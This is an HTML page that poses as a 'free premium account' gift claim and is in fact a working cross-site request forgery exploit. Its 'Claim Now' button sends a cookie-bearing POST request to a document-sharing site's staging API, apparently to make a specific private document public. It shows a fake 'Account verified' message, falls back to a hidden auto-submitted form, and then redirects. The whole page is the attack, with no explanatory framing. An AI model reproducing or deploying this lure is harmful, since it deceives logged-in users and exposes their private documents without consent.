<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Claim</title>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        .gift { font-size: 48px; margin: 20px; }
        .btn { 
            background: #FF6B6B; 
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 10px; 
            font-size: 18px; 
            cursor: pointer;
            margin: 20px;
        }
    </style>
</head>
<body>
    <div class="gift">üéÅ</div>
    <h2>Claim Your Free Premium Account!</h2>
    <p>Click below to verify your eligibility...</p>
    
    <button class="btn" onclick="performAttack()">Claim Now</button>
    
    <div id="status" style="margin-top: 20px; color: #666;"></div>

    <script>
    function performAttack() {
        document.getElementById('status').innerHTML = "Verifying your account...";
        
        // Perform stealth CSRF to make document public
        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer', {
            method: 'POST',
            credentials: 'include',  // Send cookies
            mode: 'no-cors',         // Avoid CORS issues
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({})  // Empty object like logout
        })
        .then(() => {
            document.getElementById('status').innerHTML = "‚úÖ Account verified! Redirecting...";
            
            // Redirect to document after making it public
            setTimeout(() => {
                window.location.href = "https://staging.textjam.com/doc/U5B1D57H?message=Document+now+public";
            }, 1500);
        })
        .catch(error => {
            document.getElementById('status').innerHTML = "‚ö†Ô∏è Verification failed. Trying alternative method...";
            fallbackMethod();
        });
    }
    
    function fallbackMethod() {
        // Alternative: Form submission method
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer';
        form.style.display = 'none';
        
        // No inputs needed for this endpoint
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
            window.location.href = "https://staging.textjam.com/doc/U5B1D57H";
        }, 1000);
    }
    </script>
</body>
</html>
